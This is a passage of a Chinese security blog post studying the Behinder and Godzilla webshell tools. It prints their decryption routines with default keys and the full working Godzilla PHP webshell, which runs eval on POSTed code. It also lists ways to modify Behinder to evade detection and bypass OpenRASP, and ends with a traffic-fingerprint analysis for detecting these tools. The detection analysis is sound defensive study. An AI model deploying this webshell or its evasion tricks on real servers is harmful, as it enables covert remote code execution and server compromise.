+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">private byte[] Decrypt(byte[] data) throws Exception</span><br><span class="line">&#123;</span><br><span class="line">    String k=&quot;e45e329feb5d925b&quot;;</span><br><span class="line">    int magicNum=Integer.parseInt(k.substring(0,2),16)%16; //取magic tail长度</span><br><span class="line">    data=java.util.Arrays.copyOfRange(data,0,data.length-magicNum); //截掉magic tail</span><br><span class="line">    javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),&quot;AES&quot;));</span><br><span class="line">    byte[] decodebs;</span><br><span class="line">    Class baseCls ;</span><br><span class="line">            try&#123;</span><br><span class="line">                baseCls=Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">                Object Decoder=baseCls.getMethod(&quot;getDecoder&quot;, null).invoke(baseCls, null);</span><br><span class="line">                decodebs=(byte[]) Decoder.getClass().getMethod(&quot;decode&quot;, new Class[]&#123;byte[].class&#125;).invoke(Decoder, new Object[]&#123;data&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Throwable e)</span><br><span class="line">            &#123;</span><br><span class="line">                baseCls = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">                Object Decoder=baseCls.newInstance();</span><br><span class="line">                decodebs=(byte[]) Decoder.getClass().getMethod(&quot;decodeBuffer&quot;,new Class[]&#123;String.class&#125;).invoke(Decoder, new Object[]&#123;new String(data)&#125;);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">    return c.doFinal(decodebs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>远程</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function Decrypt($data)  </span><br><span class="line">&#123;  </span><br><span class="line">	$key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond  </span><br><span class="line">	$magicNum=hexdec(substr($key,0,2))%16; //取magic tail长度  </span><br><span class="line">	$data=substr($data,0,strlen($data)-$magicNum); //截掉magic tail  </span><br><span class="line">	return openssl_decrypt(base64_decode($data), &quot;AES-128-ECB&quot;, $key,OPENSSL_PKCS1_PADDING);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>作者的文章当中也提供了很有启发性的思维 尽量以算法的方式改写冰蝎的攻击。</p>
+<h3 id="魔改思路"><a href="#魔改思路" class="headerlink" title="魔改思路"></a>魔改思路</h3><p>针对不同安全产商设备的检测原理，整理了以下几种魔改思路：</p>
+<ol>
+<li>加密解密算法，除了默认的AES，可以使用DES、3DES、TDEA、Blowfish、Twofish、RC2、RC4、RC5、IDEA、SKIPJACK等对称加密算法</li>
+<li>去除base64编码特征，请求体和响应体数据随机产生不定长度的额外字节数组</li>
+<li>去除请求头User-Agent、Accept、Referer、Content-type等特征</li>
+<li>请求包以json格式参数，响应体数据返回json格式或者html格式，数据可以拆散隐藏在html标签中</li>
+<li>修改请求协议，使用HEAD协议，长度较小的paylaod放到header执行，Shell返回404，响应数据通过ceye类似接口进行中转/服务器可访问的目录图片中转</li>
+<li>客户端不定时发送不定长度的垃圾数据</li>
+<li>基于sessionID生成密钥、payload参数名、分隔符等</li>
+<li>使用Java底层函数绕OpenRASP</li>
+<li>webshell免杀</li>
+</ol>
+<p>冰蝎作者<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7A">https://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7A</a></p>
+<p>历史冰蝎<a target="_blank" rel="noopener" href="https://www.4hou.com/shop/posts/N1rN">https://www.4hou.com/shop/posts/N1rN</a></p>
+<h2 id="Godzilla"><a href="#Godzilla" class="headerlink" title="Godzilla"></a>Godzilla</h2><p>由于哥斯拉在处理 jsp 和 php 时加密方式存在差异，本文将从 php 版的 shell 展开，对其运行原理再做一下总结和阐述。首先，生成一个 php 静态 webshell，加密器选择 <code>PHP_XOR_BASE64</code></p>
+<h3 id="HTTP请求头特征"><a href="#HTTP请求头特征" class="headerlink" title="HTTP请求头特征"></a>HTTP请求头特征</h3><h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><p>哥斯拉客户端使用 JAVA 语言编写，在默认的情况下，如果不修改 User-Agent，User-Agent 会类似于 Java/11.0.7（具体什么版本取决于 JDK 环境版本）。但是哥斯拉支持自定义 HTTP 头部，这个默认特征是可以很容易去除的</p>
+<h4 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h4><p><code>Accept</code> 头为 <code>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</code> 对这个默认特征应该很熟悉了，之前冰蝎也出现过同样的 Accept。为什么会这么巧合出现两个工具都会出现这个特征呢，其实这个也是 JDK 引入的一个特征，并不是作者自定义的 Accept。同样的这个默认特征也可以通过自定义头部去除，只能作为默认情况下的辅助检测特征</p>
+<h3 id="请求体特征"><a href="#请求体特征" class="headerlink" title="请求体特征"></a>请求体特征</h3><h4 id="PHP-XOR-BASE64"><a href="#PHP-XOR-BASE64" class="headerlink" title="PHP_XOR_BASE64"></a>PHP_XOR_BASE64</h4><p><img src="image-20220423163418629.png" alt="image-20220423163418629"></p>
+<p>以默认 shell 的密码和密钥为例，生成的文件如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123; <span class="comment">//进行异或加解密的函数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;pass&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123; <span class="comment">//对上传代码做执行并得到结果</span></span><br><span class="line">    <span class="variable">$data</span>=encode(base64_decode(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=encode(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=encode(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> base64_encode(encode(@run(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=encode(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原始代码-&gt;base64编码-&gt;异或加密</p>
+<h4 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h4><p>首次连接时会有三个连续的请求</p>
+<p><img src="image-20220423164218835.png" alt="image-20220423164218835"></p>
+<p><strong>第一个数据包</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/hackable/uploads/godzilla.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8081</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>52541</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"> </span><br><span class="line">pass=R0YEQgNVBE0GQ0YPU0YTUhoeTAtv............URVEaQgBDWTVrRG47</span><br></pre></td></tr></table></figure>
+
+<p>根据加密代码的分析，对pass进行解密后为各种功能的脚本</p>
+<p><img src="image-20220423172534851.png" alt="image-20220423172534851"></p>
+<p>可以发现该数据包并没有回包，可以作为流量识别的其中一个重要特征</p>
+<p><strong>第二个数据包</strong></p>
+<p><img src="image-20220423172841374.png" alt="image-20220423172841374"></p>
+<p>根据代码分析对会包的字符串进行解密（分析过程比较复杂，敬请期待）得到OK</p>
+<p>说明该请求一条测试请求，证明shell连接成功</p>
+<p><strong>第三个数据包</strong></p>
+<p>该请求的作用是获取目标的环境信息：</p>
+<p><img src="image-20220423173837035.png" alt="image-20220423173837035"></p>
+<p>解密得到原始代码 <code>methodName=Z2V0QmFzaWNzSW5mbw==</code>，即 <code>methodName=getBasicsInfo</code>。此操作调用 payload 中的 getBasicsInfo 方法获取目标环境信息向客户端返回。显然，这个过程又是一个固定特征</p>
+<p>至此，成功挖掘到哥斯拉客户端与 shell 建连初期的三个固定行为特征，且顺序出现在同一个 TCP 连接中。可以总结为：</p>
+<ul>
+<li>发送一段固定代码（payload），http 响应为空</li>
+<li>发送一段固定代码（test），执行结果为固定内容</li>
+<li>发送一段固定代码（getBacisInfo）</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">One</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/">http://example.com/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%B7%A5%E5%85%B7/">工具</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/"><img class="next-cover" src="/imgg/10.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">DASCTF2022NOV月赛</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">One</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">19</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/paleonec" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">博客重构中。。。。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Behinder4-0"><span class="toc-number">1.</span> <span class="toc-text">Behinder4.0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E%E9%A9%AC%E7%9A%84%E6%94%B9%E5%86%99%E4%B8%8E%E7%BB%95%E8%BF%87-tips"><span class="toc-number">1.1.</span> <span class="toc-text">冰蝎马的改写与绕过 tips</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">加密算法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%94%B9%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">魔改思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Godzilla"><span class="toc-number">2.</span> <span class="toc-text">Godzilla</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4%E7%89%B9%E5%BE%81"><span class="toc-number">2.1.</span> <span class="toc-text">HTTP请求头特征</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#User-Agent"><span class="toc-number">2.1.1.</span> <span class="toc-text">User-Agent</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Accept"><span class="toc-number">2.1.2.</span> <span class="toc-text">Accept</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E4%BD%93%E7%89%B9%E5%BE%81"><span class="toc-number">2.2.</span> <span class="toc-text">请求体特征</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-XOR-BASE64"><span class="toc-number">2.2.1.</span> <span class="toc-text">PHP_XOR_BASE64</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">2.2.2.</span> <span class="toc-text">流量分析</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/" title="Webshell工具学习"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Webshell工具学习"/></a><div class="content"><a class="title" href="/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/" title="Webshell工具学习">Webshell工具学习</a><time datetime="2023-01-21T05:30:21.000Z" title="Created 2023-01-21 13:30:21">2023-01-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/" title="DASCTF2022NOV月赛"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF2022NOV月赛"/></a><div class="content"><a class="title" href="/2022/11/30/DASCTF2022NOV%E6%9C%88%E8%B5%9B/" title="DASCTF2022NOV月赛">DASCTF2022NOV月赛</a><time datetime="2022-11-30T12:58:56.000Z" title="Created 2022-11-30 20:58:56">2022-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2022/" title="安洵杯2022"><img src="/imgg/3.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="安洵杯2022"/></a><div class="content"><a class="title" href="/2022/11/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2022/" title="安洵杯2022">安洵杯2022</a><time datetime="2022-11-28T08:59:18.000Z" title="Created 2022-11-28 16:59:18">2022-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/26/GeekChallenge2022/" title="GeekChallenge2022"><img src="/imgg/2.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GeekChallenge2022"/></a><div class="content"><a class="title" href="/2022/11/26/GeekChallenge2022/" title="GeekChallenge2022">GeekChallenge2022</a><time datetime="2022-11-26T12:22:29.000Z" title="Created 2022-11-26 20:22:29">2022-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/06/Mysqludf%E6%8F%90%E6%9D%83/" title="Mysqludf提权"><img src="/imgg/10.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Mysqludf提权"/></a><div class="content"><a class="title" href="/2022/01/06/Mysqludf%E6%8F%90%E6%9D%83/" title="Mysqludf提权">Mysqludf提权</a><time datetime="2022-01-06T06:36:42.000Z" title="Created 2022-01-06 14:36:42">2022-01-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By One</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
